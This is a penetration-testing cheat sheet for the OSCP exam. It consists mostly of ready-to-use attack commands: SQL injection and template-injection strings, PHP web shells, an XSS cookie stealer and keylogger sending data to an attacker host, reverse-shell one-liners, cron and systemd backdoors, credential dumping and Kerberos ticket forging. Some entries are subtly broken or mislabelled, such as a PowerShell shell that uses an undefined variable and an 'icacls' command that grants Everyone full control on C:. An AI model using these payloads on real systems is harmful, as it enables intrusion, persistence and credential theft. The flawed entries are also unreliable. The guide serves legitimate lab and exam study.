---
title: OSCP Master Reference Guide
description: Comprehensive command and technique reference for exam
tags: [oscp, reference, commands, techniques]
---

# OSCP Master Reference Guide

Complete reference covering enumeration, exploitation, privilege escalation, Active Directory, and all tools.

## Table of Contents

1. Network & Port Enumeration
2. Service-Specific Enumeration
3. Web Application Exploitation
4. Linux Privilege Escalation
5. Windows Privilege Escalation
6. Active Directory Attacks
7. Post-Exploitation & Pivoting
8. Tool Command Reference
9. One-Liner Payloads

---

## 1. Network & Port Enumeration

### Initial Reconnaissance

```bash
# Ping sweep to find alive hosts
nmap -sn 10.10.10.0/24

# Quick port scan (top 1000)
nmap -sV -sC 10.10.10.X

# Full port scan (all 65535 ports)
nmap -p- --min-rate=5000 10.10.10.X

# Detailed scan on found ports
nmap -sV -sC -p 21,22,80,443,3306,3389 10.10.10.X -oN nmap_detailed.txt

# OS detection and service version
nmap -A 10.10.10.X

# UDP scan (slower, but catches DNS, SNMP, etc)
nmap -sU -p 53,67,68,111,161,162,500,514,520,631,1434,1900,4500,5353,49152-49161 10.10.10.X
```

### What Each Port Typically Means

```
20,21  → FTP (anonymous login check?)
22     → SSH (version check, weak keys?)
25,587 → SMTP (open relay? user enumeration?)
53     → DNS (zone transfer? DNSSEC bypass?)
80     → HTTP (web app - SQLi, RFI, file upload?)
110    → POP3 (mail access?)
139,445 → SMB (null session? share enumeration?)
143    → IMAP (mail access?)
389    → LDAP (anonymous bind? user enumeration?)
443    → HTTPS (same as 80 but SSL)
636    → LDAPS (LDAP over SSL)
1433   → MSSQL (sa password? xp_cmdshell?)
3306   → MySQL (no password? SQLi? INTO OUTFILE?)
3389   → RDP (credential stuffing? BlueKeep?)
5432   → PostgreSQL (default creds? code execution?)
5985   → WinRM (authenticated RCE?)
8080   → HTTP alternate (web app bypass?)
27017  → MongoDB (no auth? data extraction?)
```

---

## 2. Service-Specific Enumeration

### FTP (Port 21)

```bash
# Check anonymous login
ftp 10.10.10.X
# Login: anonymous
# Password: (just press enter or type 'anonymous')
# Commands: ls, cd, get file.txt, mget *

# Nmap FTP script
nmap -p21 --script ftp-anon 10.10.10.X

# Download all files anonymously
wget -r ftp://anonymous:anonymous@10.10.10.X/
```

### SSH (Port 22)

```bash
# Banner grabbing
ssh -v 10.10.10.X 2>&1 | head -10

# Check for weak key exchange (Debian OpenSSL bug, etc)
ssh -v 10.10.10.X 2>&1 | grep -i "kex\|enc\|mac"

# Try common credentials
ssh root@10.10.10.X
ssh admin@10.10.10.X

# Brute force (if needed)
hydra -L users.txt -P pass.txt ssh://10.10.10.X

# Check for private key reuse
ssh -i private.key user@10.10.10.X
```

### DNS (Port 53)

```bash
# Enumerate DNS servers
nslookup -type=NS target.com

# Zone transfer attempt (AXFR)
nslookup
> server 10.10.10.X
> ls -d target.com

# Using dig
dig @10.10.10.X target.com axfr

# DNS brute force
dnsrecon -d target.com -D wordlist.txt -t brt
```

### HTTP/HTTPS (Port 80/443)

```bash
# Basic connection info
curl -v http://10.10.10.X

# Enumerate directories
ffuf -u http://10.10.10.X/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

# Scan for common vulnerabilities
nuclei -u http://10.10.10.X

# Check for common pages
curl -s http://10.10.10.X/robots.txt
curl -s http://10.10.10.X/sitemap.xml
curl -s http://10.10.10.X/admin/
curl -s http://10.10.10.X/login.php

# Nikto web vulnerability scanner
nikto -h http://10.10.10.X
```

### SMB (Port 139/445)

```bash
# List shares (null session)
smbclient -L //10.10.10.X -N

# Connect to share
smbclient //10.10.10.X/share -N

# Recursive download
smbclient //10.10.10.X/share -N -c "recurse; prompt; mget *"

# Mount share
mount -t cifs //10.10.10.X/share /mnt/share -o username=guest,password=""

# Enumerate with enum4linux
enum4linux -a 10.10.10.X

# Check for null sessions
smbmap -H 10.10.10.X -u '' -p ''

# Vulnerability check
nmap -p139,445 --script smb-vuln* 10.10.10.X
```

### LDAP (Port 389)

```bash
# Enumerate without auth
ldapsearch -x -h 10.10.10.X -s base namingContexts

# Full enumeration (if allowed)
ldapsearch -x -h 10.10.10.X -b "dc=target,dc=local"

# Get all users
ldapsearch -x -h 10.10.10.X -b "dc=target,dc=local" "(objectClass=user)" sAMAccountName

# Find admin users
ldapsearch -x -h 10.10.10.X -b "dc=target,dc=local" "(adminCount=1)"
```

### MSSQL (Port 1433)

```bash
# Connect without credentials
sqsh -S 10.10.10.X -U sa -P ''

# Or with mssql-cli
mssql-cli -S 10.10.10.X -U sa

# Check databases
SELECT name FROM master.sys.databases;

# Check for xp_cmdshell
EXEC xp_cmdshell 'whoami';

# Enable xp_cmdshell (if disabled)
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute commands
xp_cmdshell 'ipconfig'
```

### MySQL (Port 3306)

```bash
# Connect without password
mysql -h 10.10.10.X -u root

# Show databases
SHOW DATABASES;
USE database;
SHOW TABLES;
SELECT * FROM users;

# Check file privileges
SELECT user, file_priv FROM mysql.user;

# Write file to disk
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Read files
SELECT LOAD_FILE('/etc/passwd');

# Brute force
hydra -L users.txt -P pass.txt mysql://10.10.10.X
```

### RDP (Port 3389)

```bash
# Check if accessible
nmap -p3389 --script rdp-enum 10.10.10.X

# Connect (if credentials known)
xfreerdp /u:administrator /p:password /v:10.10.10.X

# Or with rdesktop
rdesktop -u administrator -p password 10.10.10.X

# Brute force (risky - locks out accounts)
hydra -l administrator -P pass.txt rdp://10.10.10.X
```

### WinRM (Port 5985/5986)

```bash
# Check if accessible
nmap -p5985,5986 --script winrm-enum 10.10.10.X

# Connect with credentials (Evil-WinRM)
evil-winrm -i 10.10.10.X -u administrator -p password

# Execute commands
*Evil-WinRM* PS > whoami
*Evil-WinRM* PS > Upload localfile remotefile
*Evil-WinRM* PS > Download remotefile localfile
```

---

## 3. Web Application Exploitation

### SQL Injection

```bash
# Test for SQLi
' OR '1'='1
' OR 1=1 --
' OR 1=1 #
" OR ""="
1' UNION SELECT NULL --

# Check number of columns
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --

# Extract data (MySQL)
' UNION SELECT database(),user(),version() --
' UNION SELECT table_name,column_name,3 FROM information_schema.columns --
' UNION SELECT id,username,password FROM users --

# Extract data (MSSQL)
' UNION SELECT database_name,user_name,3 FROM sys.databases --
' UNION SELECT table_name,column_name,3 FROM information_schema.tables --

# Time-based blind SQLi
' AND SLEEP(5) --
' OR SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --

# MySQL file write
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php' --
```

### File Upload

```bash
# Bypass file type check
# Upload .php as .php.jpg
# Upload .php as .jpg (then rename on server)
# Upload .phtml, .phar, .phps, .php3, .php4, .php5, .php7
# Upload .asp, .aspx, .jsp, .jspx, .jsw, .jsv, .jspf

# Bypass MIME type check
Content-Type: image/jpeg (with .php code)

# Double extension
shell.php.jpg
shell.php%00.jpg
shell.php....jpg

# Shell code to upload
<?php system($_GET['cmd']); ?>
<?php exec('/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"'); ?>
```

### Local File Inclusion (LFI)

```bash
# Basic LFI
?file=../../../etc/passwd
?page=../../etc/passwd
?include=../../../../etc/passwd

# PHP wrappers
?file=php://filter/convert.base64-encode/resource=index.php
?file=data://text/plain,<?php system('id'); ?>
?file=expect://command

# Log file poisoning (if logs are accessible)
# Access: http://target.com/search?q=<?php system('id'); ?>
# Then: ?file=../../../var/log/apache2/access.log

# Session file inclusion
?file=../../../var/lib/php/sessions/sess_SESSIONID

# Proc file read
?file=../../../proc/self/environ
```

### Server-Side Template Injection (SSTI)

```bash
# Test for SSTI
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
${7*'7'}

# Jinja2 (Python/Flask)
{{config}}
{{config.items()}}
{{''.__class__}}
{{ self }}
{{ settings }}

# Expression Language (Java)
${7*7}
${Runtime.getRuntime().exec('id')}

# ERB (Ruby)
<%= 7*7 %>
<%= system('id') %>
```

### Cross-Site Scripting (XSS)

```bash
# Basic XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Steal cookies
<script>fetch('http://ATTACKER/?c='+document.cookie)</script>

# Keylogger
<script>
document.onkeypress = function(e) {
  fetch('http://ATTACKER/?k=' + e.key);
}
</script>
```

---

## 4. Linux Privilege Escalation

### Quick Wins

```bash
# Check sudo permissions
sudo -l

# If you can run anything:
sudo /bin/bash
sudo su -

# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for world-writable files
find / -perm -002 -type f 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
```

### Systematic Enumeration

```bash
# System info
uname -a
cat /etc/os-release
cat /proc/version

# Kernel version (check for exploits)
uname -r
# Then: searchsploit "kernel version"

# Installed applications
ls /opt/
ls /usr/local/bin/
dpkg -l (Debian)
rpm -qa (RedHat)

# Running processes
ps aux

# Network connections
netstat -tlnp
ss -tlnp

# Environment variables
env

# SSH keys
ls -la ~/.ssh/
ls -la /home/*/.ssh/

# Writable directories
find / -writable -type d 2>/dev/null

# Config files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /opt/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
```

### SUID Binary Abuse (GTFOBins)

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Common SUID escalations (check gtfobins.github.io)
vim -c ':!bash'
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
find / -exec /bin/bash \; -quit
less '!bash'

# If bash has SUID set
/bin/bash -p
```

### Sudo Abuse

```bash
# Check what you can run
sudo -l

# Run directly
sudo /bin/bash

# Exploit specific programs
sudo python -c 'import os; os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo apt-get -o APT::Pre-Invoke::Command=/bin/bash install x

# Sudo with wildcards
sudo /opt/cleanup.sh   # If this runs: tar czf backup.tar.gz *
# Create file with flags: touch -- '-e sh -i -c bash -r $in'
```

### Kernel Exploits

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit "kernel version"
# Or: https://www.kernel.org/cves/

# Compile and run
gcc -o exploit exploit.c
./exploit

# Common kernels exploitable:
# 2.6.22 < 4.8.3 - Dirty COW
# Various - OverlayFS
# < 5.3 - KPTI bypass
```

### Cron Job Abuse

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# If you can write to a cron script:
echo "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" >> /opt/cleanup.sh

# Wildcard abuse (if cron runs: tar czf backup.tar.gz *)
cd /tmp
touch -- '-e sh -i -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"'
```

### Capabilities Abuse

```bash
# Check for dangerous capabilities
getcap -r / 2>/dev/null

# If binary has cap_setuid:
# It can change UID - check GTFOBins for exploitation

# Example: if perl has cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

---

## 5. Windows Privilege Escalation

### Information Gathering

```cmd
# System info
systeminfo
wmic os get name,version,buildnumber

# Check patch level (for kernel exploits)
wmic qfe get hotfixid

# Users and groups
net user
net localgroup
net localgroup administrators

# Network info
ipconfig /all
netstat -ano

# Running processes
tasklist /v

# Installed software
wmic product get name,version

# Drivers loaded
driverquery

# Services
sc query
wmic service list brief

# Environment variables
set
```

### Weak File Permissions

```cmd
# Find writable directories
powershell -Command "Get-ChildItem -Path C:\ -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object {(Get-Acl $_).Access | Where-Object {$_.IdentityReference -like '*Everyone*' -or $_.IdentityReference -like '*Authenticated Users*'}} | Select-Object FullName"

# Find writable files
icacls C:\ /grant Everyone:F

# Check service executable permissions
icacls "C:\Program Files\VulnerableApp\app.exe"
# If writable, replace with payload
```

### Unquoted Service Paths

```cmd
# Find unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows"

# If path is: C:\Program Files\Service\app.exe
# You can place: C:\Program Files\Service.exe
# Or: C:\Program.exe

# Create payload and place it
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=PORT -f exe > Service.exe
```

### Scheduled Tasks

```cmd
# List scheduled tasks
schtasks /query /fo list

# Check task details
schtasks /query /tn "TaskName" /fo list /v

# If task runs as SYSTEM and you can modify the executable:
# Replace executable with payload
```

### Token Impersonation (Potato Exploits)

```cmd
# Check for SeImpersonatePrivilege
whoami /priv

# If present, use Potato exploit
# Download: https://github.com/ohpe/juicy-potato

juicy-potato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F12A1}

# Then reverse shell as SYSTEM
```

### UAC Bypass

```cmd
# Check UAC status
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# If UAC is enabled but you have admin rights:
# Use UAC bypass technique
# https://github.com/hfiref0x/UACME

UACME.exe 45 C:\Windows\System32\cmd.exe
```

---

## 6. Active Directory Attacks

### Initial AD Reconnaissance

```bash
# Get domain info from DHCP
systemctl status isc-dhcp-server
nmblookup -A <broadcast>

# DNS enumeration
nslookup
> server 10.10.10.X
> ls -d domain.local

# Check for null LDAP bind
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local"
```

### User Enumeration

```bash
# LDAP user enumeration
ldapsearch -x -h 10.10.10.X -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName

# Kerbrute user enumeration
kerbrute userenum users.txt -d domain.local -o valid_users.txt

# SMB user enumeration
enum4linux -u '' -p '' -r 10.10.10.X
```

### Credential Access

```bash
# NTLM hash capture (Responder)
responder -I eth0 -v

# Then force connection from target (NTLM relay)
ntlmrelayx.py -t smb://target_server_ip

# Credential dumping (if you have shell on Windows)
# Mimikatz
sekurlsa::logonpasswords

# lsassy (from Linux)
lsassy 10.10.10.X -u admin -p password
```

### Kerberos Attacks

```bash
# Kerberoasting (extract TGS for cracking)
GetUserSPNs.py -request domain.local/user:password

# Silver Ticket (forge TGS)
ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain domain.local -spn cifs/server service_user

# Golden Ticket (forge TGT)
ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain domain.local admin

# Pass-The-Ticket
export KRB5CCNAME=/tmp/admin.ccache
impacket-psexec domain.local/admin@target -k -no-pass
```

### Domain Controller Compromise

```bash
# DCSync (dump domain hashes)
secretsdump.py -k domain.local/admin@dc_server

# Shadow Copy extraction
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit .

# NTDS.dit + SYSTEM hive parsing
secretsdump.py -sam SAM -system SYSTEM ntds.dit
```

### Post-Compromise Lateral Movement

```bash
# Pass-The-Hash
pth-winexe -U domain/user%hash //target cmd.exe

# Overpass-The-Hash
getTGT.py domain.local/user -hashes :hash
export KRB5CCNAME=user.ccache
psexec.py domain.local/user@target -k -no-pass

# Kerberos Relay
krbrelayx.py -aesKey KEY

# PrivExchange (Exchange vulnerability)
privexchange.py -u user -p password -d domain.local -t target_server
```

---

## 7. Post-Exploitation & Pivoting

### Credential Harvesting

```bash
# Linux credential locations
cat ~/.bashrc (look for credentials)
cat ~/.bash_history
cat /root/.ssh/id_rsa
grep -r "password" /home/ 2>/dev/null

# Windows credential harvesting
# Mimikatz
sekurlsa::logonpasswords
sekurlsa::kerberos

# Credential Manager
cmdkey /list
runas /savecred /user:domain\user cmd.exe
```

### Lateral Movement (Linux)

```bash
# SSH key reuse
for user in $(cat /etc/passwd | cut -d: -f1); do
  ssh -i /root/.ssh/id_rsa $user@other_host 2>/dev/null && echo "Success with $user"
done

# Sudo access to other systems
sudo -l
# If can run ssh: sudo ssh -i /home/other_user/.ssh/id_rsa user@host
```

### Lateral Movement (Windows)

```powershell
# PSRemoting
$cred = Get-Credential
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# RDP Connection
runas /noprofile /netonly /user:domain\admin mstsc.exe

# Pass-The-Hash
sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH /run:cmd.exe
```

### Network Pivoting

```bash
# Port forwarding via SSH
ssh -L 3306:127.0.0.1:3306 user@pivot_host

# Reverse port forwarding
ssh -R 8080:127.0.0.1:80 user@attacker_vps

# SOCKS proxy via SSH
ssh -D 9050 user@pivot_host
# Then use proxychains or set SOCKS proxy in tools

# Ligolo-ng (better tool)
./agent -connect attacker_server:11601 -ignore-cert

# Chisel
./chisel server -p 8000
./chisel client attacker:8000 R:3306:127.0.0.1:3306
```

### Persistence

```bash
# Linux cron backdoor
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/ATTACKER/PORT 0>&1") | crontab -

# Linux systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor

# Windows scheduled task
schtasks /create /tn "Backdoor" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# Windows registry run key
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Windows\Temp\payload.exe"
```

---

## 8. Tool Command Reference

### Nmap

```bash
nmap -p- --min-rate=5000 -oN allports.txt TARGET
nmap -sV -sC -p PORT1,PORT2 -oN detailed.txt TARGET
nmap -A -p- TARGET
nmap --script vuln TARGET
nmap -sU -p 53,67,123,161 TARGET (UDP)
```

### FFuf (Web Fuzzing)

```bash
ffuf -u http://TARGET/FUZZ -w wordlist.txt
ffuf -u http://TARGET/api/FUZZ -w wordlist.txt -fc 404
ffuf -u http://TARGET:PORT/FUZZ -w wordlist.txt -t 100
ffuf -u http://TARGET/FUZZ.php -w wordlist.txt
ffuf -u http://TARGET/?page=FUZZ -w wordlist.txt
ffuf -H "Host: FUZZ.TARGET" -w subdomains.txt
```

### Metasploit

```bash
msfconsole
search sql_injection
use module/path
set RHOSTS TARGET
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER
run

# Post-exploitation
sessions -l
sessions -i 1
background
```

### Impacket Tools

```bash
# SMB enumeration
smbclient -L //TARGET -N
smbmap -H TARGET -u '' -p ''

# Credential gathering
secretsdump.py domain.local/user:password@TARGET
secretsdump.py -sam SAM -system SYSTEM ntds.dit

# Remote execution
psexec.py domain.local/admin:password@TARGET
wmiexec.py domain.local/admin:password@TARGET
dcomexec.py domain.local/admin:password@TARGET

# Kerberos
getTGT.py domain.local/user:password
psexec.py -k -no-pass domain.local/user@TARGET
```

### Hashcat

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt
hashcat -m 3000 -a 0 hashes.txt wordlist.txt (LM)
hashcat -m 5600 -a 0 hashes.txt wordlist.txt (Kerberos)
hashcat --show hashes.txt
```

### John the Ripper

```bash
john --format=NT2 --wordlist=wordlist.txt hashes.txt
john --format=krb5tgs --wordlist=wordlist.txt hashes.txt
john --show hashes.txt
```

---

## 9. One-Liner Payloads

### Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# nc
nc -e /bin/sh ATTACKER PORT
```

### PowerShell Reverse Shell

```powershell
$client = New-Object System.Net.Sockets.TcpClient("ATTACKER",PORT);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendbyte2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

---

This is your complete OSCP reference. Use during exam.

